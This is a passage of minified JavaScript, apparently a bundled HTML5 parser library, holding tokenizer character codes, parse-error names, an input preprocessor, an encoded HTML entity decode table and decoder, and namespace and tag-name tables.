z;(function(e){e[e.EOF=-1]="EOF",e[e.NULL=0]="NULL",e[e.TABULATION=9]="TABULATION",e[e.CARRIAGE_RETURN=13]="CARRIAGE_RETURN",e[e.LINE_FEED=10]="LINE_FEED",e[e.FORM_FEED=12]="FORM_FEED",e[e.SPACE=32]="SPACE",e[e.EXCLAMATION_MARK=33]="EXCLAMATION_MARK",e[e.QUOTATION_MARK=34]="QUOTATION_MARK",e[e.AMPERSAND=38]="AMPERSAND",e[e.APOSTROPHE=39]="APOSTROPHE",e[e.HYPHEN_MINUS=45]="HYPHEN_MINUS",e[e.SOLIDUS=47]="SOLIDUS",e[e.DIGIT_0=48]="DIGIT_0",e[e.DIGIT_9=57]="DIGIT_9",e[e.SEMICOLON=59]="SEMICOLON",e[e.LESS_THAN_SIGN=60]="LESS_THAN_SIGN",e[e.EQUALS_SIGN=61]="EQUALS_SIGN",e[e.GREATER_THAN_SIGN=62]="GREATER_THAN_SIGN",e[e.QUESTION_MARK=63]="QUESTION_MARK",e[e.LATIN_CAPITAL_A=65]="LATIN_CAPITAL_A",e[e.LATIN_CAPITAL_Z=90]="LATIN_CAPITAL_Z",e[e.RIGHT_SQUARE_BRACKET=93]="RIGHT_SQUARE_BRACKET",e[e.GRAVE_ACCENT=96]="GRAVE_ACCENT",e[e.LATIN_SMALL_A=97]="LATIN_SMALL_A",e[e.LATIN_SMALL_Z=122]="LATIN_SMALL_Z"})(z||(z={}));const rr={DASH_DASH:"--",CDATA_START:"[CDATA[",DOCTYPE:"doctype",SCRIPT:"script",PUBLIC:"public",SYSTEM:"system"};function iC(e){return e>=55296&&e<=57343}function UF(e){return e>=56320&&e<=57343}function zF(e,t){return(e-55296)*1024+9216+t}function aC(e){return e!==32&&e!==10&&e!==13&&e!==9&&e!==12&&e>=1&&e<=31||e>=127&&e<=159}function sC(e){return e>=64976&&e<=65007||HF.has(e)}var he;(function(e){e.controlCharacterInInputStream="control-character-in-input-stream",e.noncharacterInInputStream="noncharacter-in-input-stream",e.surrogateInInputStream="surrogate-in-input-stream",e.nonVoidHtmlElementStartTagWithTrailingSolidus="non-void-html-element-start-tag-with-trailing-solidus",e.endTagWithAttributes="end-tag-with-attributes",e.endTagWithTrailingSolidus="end-tag-with-trailing-solidus",e.unexpectedSolidusInTag="unexpected-solidus-in-tag",e.unexpectedNullCharacter="unexpected-null-character",e.unexpectedQuestionMarkInsteadOfTagName="unexpected-question-mark-instead-of-tag-name",e.invalidFirstCharacterOfTagName="invalid-first-character-of-tag-name",e.unexpectedEqualsSignBeforeAttributeName="unexpected-equals-sign-before-attribute-name",e.missingEndTagName="missing-end-tag-name",e.unexpectedCharacterInAttributeName="unexpected-character-in-attribute-name",e.unknownNamedCharacterReference="unknown-named-character-reference",e.missingSemicolonAfterCharacterReference="missing-semicolon-after-character-reference",e.unexpectedCharacterAfterDoctypeSystemIdentifier="unexpected-character-after-doctype-system-identifier",e.unexpectedCharacterInUnquotedAttributeValue="unexpected-character-in-unquoted-attribute-value",e.eofBeforeTagName="eof-before-tag-name",e.eofInTag="eof-in-tag",e.missingAttributeValue="missing-attribute-value",e.missingWhitespaceBetweenAttributes="missing-whitespace-between-attributes",e.missingWhitespaceAfterDoctypePublicKeyword="missing-whitespace-after-doctype-public-keyword",e.missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers="missing-whitespace-between-doctype-public-and-system-identifiers",e.missingWhitespaceAfterDoctypeSystemKeyword="missing-whitespace-after-doctype-system-keyword",e.missingQuoteBeforeDoctypePublicIdentifier="missing-quote-before-doctype-public-identifier",e.missingQuoteBeforeDoctypeSystemIdentifier="missing-quote-before-doctype-system-identifier",e.missingDoctypePublicIdentifier="missing-doctype-public-identifier",e.missingDoctypeSystemIdentifier="missing-doctype-system-identifier",e.abruptDoctypePublicIdentifier="abrupt-doctype-public-identifier",e.abruptDoctypeSystemIdentifier="abrupt-doctype-system-identifier",e.cdataInHtmlContent="cdata-in-html-content",e.incorrectlyOpenedComment="incorrectly-opened-comment",e.eofInScriptHtmlCommentLikeText="eof-in-script-html-comment-like-text",e.eofInDoctype="eof-in-doctype",e.nestedComment="nested-comment",e.abruptClosingOfEmptyComment="abrupt-closing-of-empty-comment",e.eofInComment="eof-in-comment",e.incorrectlyClosedComment="incorrectly-closed-comment",e.eofInCdata="eof-in-cdata",e.absenceOfDigitsInNumericCharacterReference="absence-of-digits-in-numeric-character-reference",e.nullCharacterReference="null-character-reference",e.surrogateCharacterReference="surrogate-character-reference",e.characterReferenceOutsideUnicodeRange="character-reference-outside-unicode-range",e.controlCharacterReference="control-character-reference",e.noncharacterCharacterReference="noncharacter-character-reference",e.missingWhitespaceBeforeDoctypeName="missing-whitespace-before-doctype-name",e.missingDoctypeName="missing-doctype-name",e.invalidCharacterSequenceAfterDoctypeName="invalid-character-sequence-after-doctype-name",e.duplicateAttribute="duplicate-attribute",e.nonConformingDoctype="non-conforming-doctype",e.missingDoctype="missing-doctype",e.misplacedDoctype="misplaced-doctype",e.endTagWithoutMatchingOpenElement="end-tag-without-matching-open-element",e.closingOfElementWithOpenChildElements="closing-of-element-with-open-child-elements",e.disallowedContentInNoscriptInHead="disallowed-content-in-noscript-in-head",e.openElementsLeftAfterEof="open-elements-left-after-eof",e.abandonedHeadElementChild="abandoned-head-element-child",e.misplacedStartTagForHeadElement="misplaced-start-tag-for-head-element",e.nestedNoscriptInHead="nested-noscript-in-head",e.eofInElementThatCanContainOnlyText="eof-in-element-that-can-contain-only-text"})(he||(he={}));const WF=65536;class qF{constructor(t){this.handler=t,this.html="",this.pos=-1,this.lastGapPos=-2,this.gapStack=[],this.skipNextNewLine=!1,this.lastChunkWritten=!1,this.endOfChunkHit=!1,this.bufferWaterline=WF,this.isEol=!1,this.lineStartPos=0,this.droppedBufferSize=0,this.line=1,this.lastErrOffset=-1}get col(){return this.pos-this.lineStartPos+ +(this.lastGapPos!==this.pos)}get offset(){return this.droppedBufferSize+this.pos}getError(t,n){const{line:r,col:a,offset:l}=this,u=a+n,f=l+n;return{code:t,startLine:r,endLine:r,startCol:u,endCol:u,startOffset:f,endOffset:f}}_err(t){this.handler.onParseError&&this.lastErrOffset!==this.offset&&(this.lastErrOffset=this.offset,this.handler.onParseError(this.getError(t,0)))}_addGap(){this.gapStack.push(this.lastGapPos),this.lastGapPos=this.pos}_processSurrogate(t){if(this.pos!==this.html.length-1){const n=this.html.charCodeAt(this.pos+1);if(UF(n))return this.pos++,this._addGap(),zF(t,n)}else if(!this.lastChunkWritten)return this.endOfChunkHit=!0,z.EOF;return this._err(he.surrogateInInputStream),t}willDropParsedChunk(){return this.pos>this.bufferWaterline}dropParsedChunk(){this.willDropParsedChunk()&&(this.html=this.html.substring(this.pos),this.lineStartPos-=this.pos,this.droppedBufferSize+=this.pos,this.pos=0,this.lastGapPos=-2,this.gapStack.length=0)}write(t,n){this.html.length>0?this.html+=t:this.html=t,this.endOfChunkHit=!1,this.lastChunkWritten=n}insertHtmlAtCurrentPos(t){this.html=this.html.substring(0,this.pos+1)+t+this.html.substring(this.pos+1),this.endOfChunkHit=!1}startsWith(t,n){if(this.pos+t.length>this.html.length)return this.endOfChunkHit=!this.lastChunkWritten,!1;if(n)return this.html.startsWith(t,this.pos);for(let r=0;r<t.length;r++)if((this.html.charCodeAt(this.pos+r)|32)!==t.charCodeAt(r))return!1;return!0}peek(t){const n=this.pos+t;if(n>=this.html.length)return this.endOfChunkHit=!this.lastChunkWritten,z.EOF;const r=this.html.charCodeAt(n);return r===z.CARRIAGE_RETURN?z.LINE_FEED:r}advance(){if(this.pos++,this.isEol&&(this.isEol=!1,this.line++,this.lineStartPos=this.pos),this.pos>=this.html.length)return this.endOfChunkHit=!this.lastChunkWritten,z.EOF;let t=this.html.charCodeAt(this.pos);return t===z.CARRIAGE_RETURN?(this.isEol=!0,this.skipNextNewLine=!0,z.LINE_FEED):t===z.LINE_FEED&&(this.isEol=!0,this.skipNextNewLine)?(this.line--,this.skipNextNewLine=!1,this._addGap(),this.advance()):(this.skipNextNewLine=!1,iC(t)&&(t=this._processSurrogate(t)),this.handler.onParseError===null||t>31&&t<127||t===z.LINE_FEED||t===z.CARRIAGE_RETURN||t>159&&t<64976||this._checkForProblematicCharacters(t),t)}_checkForProblematicCharacters(t){aC(t)?this._err(he.controlCharacterInInputStream):sC(t)&&this._err(he.noncharacterInInputStream)}retreat(t){for(this.pos-=t;this.pos<this.lastGapPos;)this.lastGapPos=this.gapStack.pop(),this.pos--;this.isEol=!1}}var ot;(function(e){e[e.CHARACTER=0]="CHARACTER",e[e.NULL_CHARACTER=1]="NULL_CHARACTER",e[e.WHITESPACE_CHARACTER=2]="WHITESPACE_CHARACTER",e[e.START_TAG=3]="START_TAG",e[e.END_TAG=4]="END_TAG",e[e.COMMENT=5]="COMMENT",e[e.DOCTYPE=6]="DOCTYPE",e[e.EOF=7]="EOF",e[e.HIBERNATION=8]="HIBERNATION"})(ot||(ot={}));function lC(e,t){for(let n=e.attrs.length-1;n>=0;n--)if(e.attrs[n].name===t)return e.attrs[n].value;return null}const $F=new Uint16Array('<\0\0\0\0\0\0EMabcfglmnoprstu\\bfmsligP&cutereve;iyx}rc;r;ravepha;acr;d;gpon;f;plyFunction;ingcsr;ign;ildemlaceforsucrkslash;;ed;y;crtause;noullis;a;r;pf;eve;cmpeq;HOacdefhilorsucy;PYcpyute;;italDifferentialD;leys;aeioron;dilrc;nint;ot;dnilla;terDot;i;rcleDMPTot;inus;lus;imes;ocskwiseContourIntegral;eCurlyDQoubleQuote;uote;lnpuon;e;gitruent;nt;ourIntegral;fr;oduct;nterClockwiseContourIntegral;oss;cr;p;Cap;DJSZacefios;otrahd;cy;cy;cy;grsger;r;hv;ayron;;l;ta;r;afcmriticalADGTcute;o;bleAcute;rave;ilde;ond;ferentialD;\0\0\0\0f;;DEot;qual;bleCDLRUVontourIntegrao\0\0nArrow;eoftARTrrow;ightArrow;engLReftARrrow;ightArrow;ightArrow;ightATrrow;ee;p\0\0rrow;ownArrow;erticalBar;nABLRTarrow;BUar;pArrow;reve;eft\0\0ightVector;eeVector;ector;Bar;ight\0eeVector;ector;Bar;ee;Arrow;ctr;rok;NTacdfglmopqstuxG;Hcuteaiyron;rc;ot;r;raveement;apcr;ty\0\0mallSquare;erySmallSquare;gpon;f;silon;uail;Tilde;librium;cir;m;a;mlipsts;onentialE;cfiosy;r;lled\0\0mallSquare;erySmallSquare;\0\0\0f;All;riertrf;cJTabcdfgorstcy;>mma;d;reve;eiydil;rc;;ot;r;;pf;eaterEFGLSTqual;Less;ullEqual;reater;ess;lantEqual;ilde;cr;;AacfiosuRDcy;ctek;;irc;r;lbertSpace;\0f;izontalLine;ctrok;mpownHumqual;EJOacdfgmnostucy;lig;cy;cuteiyrc;ot;r;rave;apcgr;inaryI;lie\0;egrral;section;isibleCTomma;imes;gpton;f;a;cr;ilde;\0cy;lcfosuiyrc;;r;pf;\0r;rcy;kcy;HJacfoscy;cy;ppa;eydil;;r;pf;cr;JTaceflmostcy;<cmnprute;bda;g;lacetrf;r;aeyron;dil;;fstACDFRTUVarnrgleBracket;row;BRar;ightArrow;eiling;o\0bleBracket;n\0eeVector;ector;Bar;loor;ightAVrrow;ector;ere;AVrrow;ector;iangle;BEar;qual;pDTVownVector;eeVector;ector;Bar;ector;Bar;ightsEFGLSTqualGreater;ullEqual;reater;ess;lantEqual;ilde;r;;eftarrow;idot;npwgLRlreftARrrow;ightArrow;ightArrow;eftarightightf;erLReftArrow;ightArrow;cht;rok;;acefiosup;y;dliumSpace;lintrf;r;nusPlus;pf;c;Jacefostucy;cute;aeyron;dil;;gswativeMTVediumSpace;hicneryThitedGLreaterGreateessLesLine;r;Bnptreak;BreakingSpace;f;;CDEGHLNPRSTVoungruent;pCap;oubleVerticalBar;lqxement;ual;Tilde;ists;reater;EFGLSTqual;ullEqual;reater;ess;lantEqual;ilde;umpownHump;qual;efstTriangle;BEar;qual;s;EGLSTqual;reater;ess;lantEqual;ilde;estedGLreaterGreater;essLess;recedes;ESqual;lantEqual;eiverseElement;ghtTriangle;BEar;qual;quuareSubpset;Equal;erset;Equal;bcpset;Equal;ceeds;ESTqual;lantEqual;ilde;erset;Equal;ilde;EFTqual;ullEqual;ilde;erticalBar;cr;ilde;Eacdfgmoprstuvlig;cuteiyrc;blac;r;raveaeicr;ga;cron;pf;enCurlyDQoubleQuote;uote;;clr;ashidees;mlerBParr;acek;et;arenthesis;acfhilorsrtialD;y;r;i;;usMinus;ipncareplanf;;eiocedes;ESTqual;lantEqual;ilde;me;dpuct;ortion;al;cir;;UfosOT"r;pf;cr;BEacefhiorsuarr;Gcnrute;g;r;tl;aeyron;dil;;;verseEUlqement;uilibrium;pEquilibrium;ro;ghtACDFTUVanrgleBracket;row;BLar;eftArrow;eiling;o\0bleBracket;n\0eeVector;ector;Bar;loor;ere;AVrrow;ector;iangle;BEar;qual;pDTVownVector;eeVector;ector;Bar;ector;Bar;puf;ndImplies;ightarrow;chr;;leDelayed;HOacfhimoqstuCcHcy;y;FTcy;cute;;aeiyron;dil;rc;;r;ortDLRUownArroweftArrowightArrowpArrow;gma;allCircle;pf;\0\0t;are;ISUntersection;ubpset;Equal;erset;Equal;nion;cr;ar;bcmp;set;Equal;cheeds;ESTqual;lantEqual;ilde;Th;;esrset;Equal;etHRSacfhiorsORNADE;Hccy;y;bu;;aeyron;dil;;r;ei\0efore;a;cnkSpace;Space;lde;EFTqual;ullEqual;ilde;pf;ipleDot;ctr;rok;\0\0\0\0\0\0\0cruter;ocir;r\0y;ve;iyrc;blac;r;raveacr;dierBParr;acek;et;arenthesis;on;Plus;gpon;f;ADETadpsrrow;BDar;ownArrow;ownArrow;quilibrium;ee;Arrow;ownerLReftArrow;ightArrow;i;lon;ing;cr;ilde;mlDbcdefosvash;ar;y;ash;l;er;btyar;;icalBLSTar;ine;eparator;ilde;ThinSpace;r;pf;cr;dash;cefosirc;dge;r;pf;cr;fiosr;;pf;cr;AIUacfosucy;cy;cy;cuteiyrc;;r;pf;cr;ml;Hacdefoscy;cute;ayron;;ot;\0oWidta;r;pf;cr;\0\0\0\0\0\0\0cutereve;;Ediuy;;rcte;lig;r;raveepfpsym;ha;apcclr;g;\0\0;adsvnd;;lope;;;elmrsz;esd;a;;;;;;;;t;vb;d;pth;arr;gpon;f;;Eaeiop;cir;;d;s;rox;eingctyr;;mp;eildemlcioninnt;Nabcdefiklnoprsuot;crkcepsong;psilon;rime;im;eq;ee;ed;gerk;tbrk;oy;quo;cmprtaus;eptyv;snoahw;;een;r;gcostuvwaiurc;pdptot;lus;imes;\0\0cup;ar;riangleduown;p;plus;earow;akocnklstozenge;riangle;dlrown;eft;ight;k;\0\0;;4;ck;eo;q=uiv;t;ptwxf;;tomtie;DHUVbdhmptuvLRlr;;;;;DUdu;;;;LRlr;;;;;HLRhlr;;;;;;ox;LRlr;;;;;DUdu;;;;inus;lus;imes;LRlr;;;;;HLRhlr;;;;;;evbarceior;mi;m;el;bh;sub;l;etp;Ee;;q\0\0\0\0\0\0\0\0\0\0cprute;;abcdsnd;rcup;aup;p;ot;;eot;aeiu\0s;on;dilrc;ps;sm;ot;dmnilptyv;t;err;ceiy;ck;mark;r;Ecefms;;elq;e\0\0rrowlreft;ight;RSacd;st;irc;ash;nint;id;cir;ubs;uit\0on;e;q\0\0a;t;;flemxente\0;dot;nfry;o;sr;aorr;ss;cur;bp;e;;e;dot;delprvwarrlr;;\0\0r;c;arr;p;;bcdosrcap;aup;p;ot;r;;alrvrr;m;yevwq\0\0reuee;edge;enearrowlreftightecioninnt;lcty;AHabcdefhijlorstuwzrar;glrsger;eth;h;varow;aayron;;;aogrr;tseq;glmta;ptyv;irsht;;arlraegsvm;osnd;suit;amma;in;;iode;ontimes;ncy;c\0\0rn;op;lptuwlar;f;;empsq;dot;inus;lus;quare;blebarwedgnadhownarrowarpoonlrefighkaro\0\0rn;op;cotry;;l;rok;drot;i;fahraangle;ciy;grarr;DacdefglmnopqrstuxDoocsuteter;aioyron;r;clon;;ot;Drot;;;rsave;dot;;ilsnters;;;dot;apscr;ty;svetp1;;;gs;p;gpon;f;alsr;sl;us;i;lvon;csuviorc\0\0antgltressaeils;st;v;DD;parsl;Daot;rr;cdir;oah;mrlo;cipl;seoctationential\0\0\0\0\0\0\0llingdotsey;male;ilrlig;\0\0g;ig;;lig;lig;fjaltt;ig;ns;of;\0f;ak;v;artint;aocs\0\0;;;;\0;;\0\0;;5;\0;;8;l;wn;cr;Eabcdefgijlnorstv;l;cmpute;ma;d;reve;iyrc;;ot;;lqs;qslan;cdlc;ot;o;l;;es;r;;gmel;cy;;Eaj;;;Eaes;p;prox;q;qim;pf;cir;m;el;;>;cdlqrci;r;ot;Par;uest;adels\0pror;qlqlesienrtneqq;Aabcefkosyrilmrrsfildrcy;;cwir;;ar;irc;alrrts;uitlip;con;r;sewarow;arow;amoprrr;tht;klreftarrow;ightarrow;f;bar;cltr;asrok;bpull;hen\0\0\0\0\0\0cute;iyrc;cxy;clfr;rave;inoinnt;t;fin;ta;lig;aopcgtr;elpinarh;f;ed;;cfotare;in;tie;do;celpal;grerarhk;rod;cgpty;on;f;a;uestcir;n;Edsv;ot;;v;;ilde;\0cy;lcfmosuiyrc;;r;ath;pf;\0r;rcy;kcy;acfghjosppa;v;eydil;;r;reen;cy;cy;pf;cr;ABEHabcdefghjlmnoprstuvartrail;arr;;g;ar;\0\0\0\0\0\0\0\0\0ute;mptyv;rabda;g;dl;;uor;bfhlpst;fs;s;p;l;im;l;;aeil;;s;abrrr;rk;akcek;;es;ldu;;aeuyron;diil;;cqrsa;uo;rduhar;shar;h;;fgqstahlrtrrow;taarpoonduownpeftarrows;ightahsrrow;sarpoonquigarrohreetimes;;qslan;cdgsc;ot;o;r;;es;adegspproot;qgqgtiilrsht;;;E;rdu;l;lk;cy;;achtrorneard;ri;iodot;ust;acheEaes;p;prox;q;qim;abnoptwznrg;r;rglmreftarightapsto;ightparrowlrefight;aflr;;us;imes;st;;efngear;lt;achmtrornear;d;;ri;achiqtquo;r;m;eg;;buo;r;rok;<;cdhilqrci;r;remes;arr;uest;Piar;;efrdushar;har;enrtneqq;DacdefhilnopsuDot;clprret;;ese;sto;dluowefker;oymma;;ash;asuredangler;o;cdnro;acdsir;otus;bd;u;p;dpels;f;ctr;pos;lmtimap;GLRVabcdefghijlmoprstuvwgt;;veltftarrrow;ightarrow;;;vightarrow;Ddash;ash;bcnptlaute;g;;Eiop;d;s;rour;al;s\0pmp;eaeouy\0;on;dil;ng;dot;p;;ash;;Aadqsxrr;rhrk;;oot;uieiar;ist;sr;Eest;qs;qslani;rAaprrr;ar;;sv;d;cy;AEadestr;rr;r;;fqstarrroightarro;qslan;si;ri;eiptf;;inn;Edv;ot;;;i;v;;aorr;astllel;;lint;;ceu;c;eAaitrrr;cw;;ghtarrowri;echimpqu;ceru;ort\0\0arm;e;qsubpbcp;Ees;et;eq;qc;e;Ees;et;eq;qgilrldeianglelreft;eight;e;m;esro;p;DHadgilrsash;arr;p;ash;et;;>nfin;Aetrr;;;r<ie;Atrr;rie;im;Aanrr;rhrk;;oear;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0csuteiyr;c;abioslac;v;old;lig;crir;;\0\0\0n;ave;bmar;acitrirr;oss;n;aeicr;ga;cdnron;;pf;aelr;rp;;adiosvr;efmr;ofgof;r;lope;;cloashl;idees;as;mlbar;\0\0\0\0\0\0\0\0\0r;ast;lle\0\0m;;y;rcimptnt;od;il;enk;r;imo;v;mane;;tvchfork;aunckk;h;s;abcdemstcir;ir;ou;;nim;wo;ipuntint;f;nd;Eaceinosu;p;u;c;acenspprourlyeaespprox;qq;im;ime;sEasdfpalslar;ine;urf;;trel;cir;;ncsp;fiopsur;pf;rime;cr;aeoteirnionnt;st;eABHabcdefhilmnoprstuxartrail;arar;cdenqrteu;te;imptyv;g;del;;uor;abcfhlpstwp;;fs;;s;l;im;l;;aiil;o;nalabrrrk;akcek;;es;ldu;;aeuyron;diil;;clqsa;dhar;uo;rh;acgl;ipsnart;ilrsht;;aordu;l;;v;gnshtahlrstrrow;taarpoonduowpeftahrrowarpoonightarrows;quigarrohreetimes;g;ingdotseahmra;oust;achemid;abptnrg;r;raflr;;us;imes;apr;gt;olint;arachqquo;r;buo;rhirremes;i;efltri;luhar;;\0\0\0\0\0\0\0cute;qu;Eaceinpsy;\0;on;u;dil;rc;Eas;p;im;olint;i;ot;be;Aacmstxrr;rhr;oti;war;minnut;r;oacoyrp;hycy;;rt\0\0iaragmma;fv;;deglnprot;;q;E;;E;e;lus;arr;araeitlslsetmhp;parsl;dle;;e;s;flptcy;;b;ar;f;adres;uitcsuaup;s;p;s;ubp;eset;e;eset;e;afrarcemtr;tmiararr;fanighteppsilohsbcmnp;Edemnprs;ot;;dot;ult;Ee;;lus;arr;eiut;enq;qeq;qm;bp;;c;acenspprourlyeaespproqg;123;Edehlmnps;ost;ub;;dot;soul;b;arr;ult;Ee;;lus;eiut;enq;qeq;qm;bp;;Aanrr;rhr;owar;lig\0\0\0\0\0\0\0\0\0\0\0\0get;;raeyron;dil;;lrec;r;eiko\0e4fa;svym;cnkaspproimsasrnes;bd;ar;;eps;bcfot;ir;;ork;rime;aipdadempstngle;dlqrowneft;e;ight;eot;inus;lus;b;ime;ezium;chtry;;cy;rok;ioxheadlreftarroightarrowAHabcdfghlmoprstuwrar;cruter\0y;ve;iyrc;abhrlac;airsht;;raverlrlk;ct\0\0rn;erop;ri;alcr;gpon;f;adhlsuownarpoonlrefighi;hlonparrows;cit\0\0rn;erop;ng;ri;cr;dirot;lde;i;famrlangle;ABDacdeflnoprszrar;v;asnrgrt;eknprstappothinhirop;hiugmbpsetneq;q;setneq;q;hretianglelreftighty;ashelr;bear;q;lip;btar;trsubppf;rotrcur;bpnEenEeigzag;cefoprsirc;dibgar;e;q;erp;r;pf;;eatcr;\0\0\0\0\0\0\0trr;Aarr;Aarrais;dptfl;imAarrcqr;ptracefiosucuyte;iyrc;;nr;cy;pf;cr;cmy;lacdefhioswcute;ayron;;ot;ettra;r;cy;grarr;pf;cr;jn;j;'.split("").map(e=>e.charCodeAt(0))),YF=new Map([[0,65533],[128,8364],[130,8218],[131,402],[132,8222],[133,8230],[134,8224],[135,8225],[136,710],[137,8240],[138,352],[139,8249],[140,338],[142,381],[145,8216],[146,8217],[147,8220],[148,8221],[149,8226],[150,8211],[151,8212],[152,732],[153,8482],[154,353],[155,8250],[156,339],[158,382],[159,376]]);function VF(e){var t;return e>=55296&&e<=57343||e>1114111?65533:(t=YF.get(e))!==null&&t!==void 0?t:e}var En;(function(e){e[e.NUM=35]="NUM",e[e.SEMI=59]="SEMI",e[e.EQUALS=61]="EQUALS",e[e.ZERO=48]="ZERO",e[e.NINE=57]="NINE",e[e.LOWER_A=97]="LOWER_A",e[e.LOWER_F=102]="LOWER_F",e[e.LOWER_X=120]="LOWER_X",e[e.LOWER_Z=122]="LOWER_Z",e[e.UPPER_A=65]="UPPER_A",e[e.UPPER_F=70]="UPPER_F",e[e.UPPER_Z=90]="UPPER_Z"})(En||(En={}));const GF=32;var ya;(function(e){e[e.VALUE_LENGTH=49152]="VALUE_LENGTH",e[e.BRANCH_LENGTH=16256]="BRANCH_LENGTH",e[e.JUMP_TABLE=127]="JUMP_TABLE"})(ya||(ya={}));function M0(e){return e>=En.ZERO&&e<=En.NINE}function QF(e){return e>=En.UPPER_A&&e<=En.UPPER_F||e>=En.LOWER_A&&e<=En.LOWER_F}function KF(e){return e>=En.UPPER_A&&e<=En.UPPER_Z||e>=En.LOWER_A&&e<=En.LOWER_Z||M0(e)}function XF(e){return e===En.EQUALS||KF(e)}var vn;(function(e){e[e.EntityStart=0]="EntityStart",e[e.NumericStart=1]="NumericStart",e[e.NumericDecimal=2]="NumericDecimal",e[e.NumericHex=3]="NumericHex",e[e.NamedEntity=4]="NamedEntity"})(vn||(vn={}));var Si;(function(e){e[e.Legacy=0]="Legacy",e[e.Strict=1]="Strict",e[e.Attribute=2]="Attribute"})(Si||(Si={}));class ZF{constructor(t,n,r){this.decodeTree=t,this.emitCodePoint=n,this.errors=r,this.state=vn.EntityStart,this.consumed=1,this.result=0,this.treeIndex=0,this.excess=1,this.decodeMode=Si.Strict}startEntity(t){this.decodeMode=t,this.state=vn.EntityStart,this.result=0,this.treeIndex=0,this.excess=1,this.consumed=1}write(t,n){switch(this.state){case vn.EntityStart:return t.charCodeAt(n)===En.NUM?(this.state=vn.NumericStart,this.consumed+=1,this.stateNumericStart(t,n+1)):(this.state=vn.NamedEntity,this.stateNamedEntity(t,n));case vn.NumericStart:return this.stateNumericStart(t,n);case vn.NumericDecimal:return this.stateNumericDecimal(t,n);case vn.NumericHex:return this.stateNumericHex(t,n);case vn.NamedEntity:return this.stateNamedEntity(t,n)}}stateNumericStart(t,n){return n>=t.length?-1:(t.charCodeAt(n)|GF)===En.LOWER_X?(this.state=vn.NumericHex,this.consumed+=1,this.stateNumericHex(t,n+1)):(this.state=vn.NumericDecimal,this.stateNumericDecimal(t,n))}addToNumericResult(t,n,r,a){if(n!==r){const l=r-n;this.result=this.result*Math.pow(a,l)+Number.parseInt(t.substr(n,l),a),this.consumed+=l}}stateNumericHex(t,n){const r=n;for(;n<t.length;){const a=t.charCodeAt(n);if(M0(a)||QF(a))n+=1;else return this.addToNumericResult(t,r,n,16),this.emitNumericEntity(a,3)}return this.addToNumericResult(t,r,n,16),-1}stateNumericDecimal(t,n){const r=n;for(;n<t.length;){const a=t.charCodeAt(n);if(M0(a))n+=1;else return this.addToNumericResult(t,r,n,10),this.emitNumericEntity(a,2)}return this.addToNumericResult(t,r,n,10),-1}emitNumericEntity(t,n){var r;if(this.consumed<=n)return(r=this.errors)===null||r===void 0||r.absenceOfDigitsInNumericCharacterReference(this.consumed),0;if(t===En.SEMI)this.consumed+=1;else if(this.decodeMode===Si.Strict)return 0;return this.emitCodePoint(VF(this.result),this.consumed),this.errors&&(t!==En.SEMI&&this.errors.missingSemicolonAfterCharacterReference(),this.errors.validateNumericCharacterReference(this.result)),this.consumed}stateNamedEntity(t,n){const{decodeTree:r}=this;let a=r[this.treeIndex],l=(a&ya.VALUE_LENGTH)>>14;for(;n<t.length;n++,this.excess++){const u=t.charCodeAt(n);if(this.treeIndex=JF(r,a,this.treeIndex+Math.max(1,l),u),this.treeIndex<0)return this.result===0||this.decodeMode===Si.Attribute&&(l===0||XF(u))?0:this.emitNotTerminatedNamedEntity();if(a=r[this.treeIndex],l=(a&ya.VALUE_LENGTH)>>14,l!==0){if(u===En.SEMI)return this.emitNamedEntityData(this.treeIndex,l,this.consumed+this.excess);this.decodeMode!==Si.Strict&&(this.result=this.treeIndex,this.consumed+=this.excess,this.excess=0)}}return-1}emitNotTerminatedNamedEntity(){var t;const{result:n,decodeTree:r}=this,a=(r[n]&ya.VALUE_LENGTH)>>14;return this.emitNamedEntityData(n,a,this.consumed),(t=this.errors)===null||t===void 0||t.missingSemicolonAfterCharacterReference(),this.consumed}emitNamedEntityData(t,n,r){const{decodeTree:a}=this;return this.emitCodePoint(n===1?a[t]&~ya.VALUE_LENGTH:a[t+1],r),n===3&&this.emitCodePoint(a[t+2],r),r}end(){var t;switch(this.state){case vn.NamedEntity:return this.result!==0&&(this.decodeMode!==Si.Attribute||this.result===this.treeIndex)?this.emitNotTerminatedNamedEntity():0;case vn.NumericDecimal:return this.emitNumericEntity(0,2);case vn.NumericHex:return this.emitNumericEntity(0,3);case vn.NumericStart:return(t=this.errors)===null||t===void 0||t.absenceOfDigitsInNumericCharacterReference(this.consumed),0;case vn.EntityStart:return 0}}}function JF(e,t,n,r){const a=(t&ya.BRANCH_LENGTH)>>7,l=t&ya.JUMP_TABLE;if(a===0)return l!==0&&r===l?n:-1;if(l){const h=r-l;return h<0||h>=a?-1:e[n+h]-1}let u=n,f=u+a-1;for(;u<=f;){const h=u+f>>>1,m=e[h];if(m<r)u=h+1;else if(m>r)f=h-1;else return e[h+a]}return-1}var be;(function(e){e.HTML="http://www.w3.org/1999/xhtml",e.MATHML="http://www.w3.org/1998/Math/MathML",e.SVG="http://www.w3.org/2000/svg",e.XLINK="http://www.w3.org/1999/xlink",e.XML="http://www.w3.org/XML/1998/namespace",e.XMLNS="http://www.w3.org/2000/xmlns/"})(be||(be={}));var os;(function(e){e.TYPE="type",e.ACTION="action",e.ENCODING="encoding",e.PROMPT="prompt",e.NAME="name",e.COLOR="color",e.FACE="face",e.SIZE="size"})(os||(os={}));var Dr;(function(e){e.NO_QUIRKS="no-quirks",e.QUIRKS="quirks",e.LIMITED_QUIRKS="limited-quirks"})(Dr||(Dr={}));var ce;(function(e){e.A="a",e.ADDRESS="address",e.ANNOTATION_XML="annotation-xml",e.APPLET="applet",e.AREA="area",e.ARTICLE="article",e.ASIDE="aside",e.B="b",e.BASE="base",e.BASEFONT="basefont",e.BGSOUND="bgsound",e.BIG="big",e.BLOCKQUOTE="blockquote",e.BODY="body",e.BR="br",e.BUTTON="button",e.CAPTION="caption",e.CENTER="center",e.CODE="code",e.COL="col",e.COLGROUP="colgroup",e.DD="dd",e.DESC="desc",e.DETAILS="details",e.DIALOG="dialog",e.DIR="dir",e.DIV="div",e.DL="dl",e.DT="dt",e.EM="em",e.EMBED="embed",e.FIELDSET="fieldset",e.FIGCAPTION="figcaption",e.FIGURE="figure",e.FONT="font",e.FOOTER="footer",e.FOREIGN_OBJECT="foreignObject",e.FORM="form",e.FRAME="frame",e.FRAMESET="frameset",e.H1="h1",e.H2="h2",e.H3="h3",e.H4="h4",e.H5="h5",e.H6="h6",e.HEAD="head",e.HEADER="header",e.HGROUP="hgroup",e.HR="hr",e.HTML="html",e.I="i",e.IMG="img",e.IM